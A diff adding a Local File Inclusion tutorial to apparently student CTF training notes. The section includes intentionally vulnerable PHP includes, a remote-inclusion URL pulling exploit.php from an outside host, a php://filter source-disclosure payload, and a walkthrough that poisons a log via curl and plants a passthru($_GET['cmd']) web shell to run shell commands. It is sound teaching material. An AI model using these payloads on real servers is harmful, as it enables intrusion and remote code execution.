@@ -404,3 +404,111 @@ A1 - Injection
 https://www.owasp.org/index.php/Top_10_2013-A1-Injection
 //TODO: 1-3 practical
 
+
+Local File Inclusion
+--------------------
+A file inclusion vulnerability is a type of vulnerability that is often found on websites. It allows an attacker to include a file , usually through a script on the webserver.
+The vulnerability occurs due to the use of user-supplied input without proper validation. 
+
+Consider this PHP example:
+```php
+<?php
+   if ( isset( $_GET['COLOR'] ) ) {
+	   include( $_GET['COLOR'] . '.php' );
+   }
+?>
+```
+
+In this example, making use of the COLOR parameter, an attacker is able to specify an arbitrary file to be included.
+*vulnerable.php?color=<b>exploit.php</b> - Executes codes from an existing file in the server.
+
+However, if the server was misconfigured, the vulnerability can become more critical.
+PHP misconfiguration: allow_url_include=on and allow_url_fopen=on
+*vulnerable.php?color=<b>http://www.nusgreyhats.org/exploit.php</b> - Injects a remotely hosted file containing malicious codes
+
+Since PHP 5.0.0, an attacker is able to use the function PHP://filter/convert.base64-encode/resource to view the source code of any PHP file.
+*vulnerable.php?color=<b>php://filter/convert.base64-encode/resource=vulnerable</b> - View the source code of vulnerable.php in base64 encoding.
+With the base64 encoding of <b>vulnerable.php</b>, an attacker can decode the file and obtain the source code.
+
+### Practical: Local File Inclusion
+Please look at the problem on the scoreboard, and obtain the URL for this problem. Using the PHP filter function, view the source code of the file.
+
+Take a look at the source of index.php:
+```php
+<?php
+$pwhash="ffd313452dab00927cb61065a392f30ae454e70f";
+
+if (@$_GET['log']) {
+		include($_GET['log'].".log");
+}
+include((@$_GET['page']?$_GET['page'].".php":"main.php"));
+
+?>
+```
+
+Now, the goal of a hacker, is to manipulate the program into running arbitrary commands that the programmer did not intend for. 
+Here, we see two segments that includes files. Now, the log file would be interesting, and the next section will show you why.
+
+Now, we take a look at the other files:
+login.php:
+```php
+<?php
+$login=@$_POST['login'];
+$password=@$_POST['password'];
+if(@$login=="admin" && sha1(@$password)==$pwhash){
+	//don't bother logging in
+	//try something else
+}else if (@$login&&@$password&&@$_GET['debug']) {
+	echo "Login error, login credentials has been saved to ./".htmlentities($login).".log";
+	$logfile = "./".$login.".log";
+	file_put_contents($logfile, $login."\n".$password);
+}
+?>
+<center>
+login<br/><br/>
+<form action="" method="POST">
+<input name="login" placeholder="login"><br/>
+<input name="password" placeholder="password"><br/><br/>
+<input type="submit" value="Go!">
+</form>
+</center>
+```
+
+From login.php, we can tell that it'd be difficult to crack the ```$pwhash```. However, there is an interesting section of the code that logs login attempt to a file determined by the username provided.
+Remember from ```index.php```, you are able to include log files? Got an idea of how to run arbitrary commands now?
+
+Let's first try to use the logging function to write some PHP code into the log file, and then run it using ```index.php```.
+*index.php?page=login&debug=1 - Username = nusgreyhats & Password = <?php echo "HAHA GOT YOU!"; ?>
+Or
+```curl -d "login=nusgreyhats&password=<?php echo \"HAHA GOT YOU!\"?>" "http://url/index.php?page=login&debug=1"```
+Remember to change the URL to the correct URL.
+
+Now let's browse to the log file to see if it is written accurately.
+*http://URL/nusgreyhats.log - You should see the PHP code you've specified being output.
+
+Great! Now we can proceed to write PHP codes that allows use to run arbitrary commands.
+Write this to the log file:
+```php
+<?
+passthru($_GET['cmd']);
+?>
+```
+Take a look at the PHP manual for the passthru function:
+http://php.net/manual/en/function.passthru.php
+What it does is to execute a command on the machine and to pass the output back to the browser.
+Therefore, using passthru, we are able to enumerate directories.
+
+Now, using the ```index.php?log=nusgreyhats``` method, let's run some arbitrary commands.
+
+Let's first try to run a ```ls``` command.
+*http://URL/index.php?log=nusgreyhats&cmd=ls - You should be able to see the contents of the current working directory.
+
+Now, we see the flag_ctf101.txt file located in the directory.
+
+Let's ```cat``` the file to see the contents.
+*http://URL/index.php?log=nusgreyhats&cmd=cat flag_ctf101.txt
+
+YAY we got the flag!
+
+
+
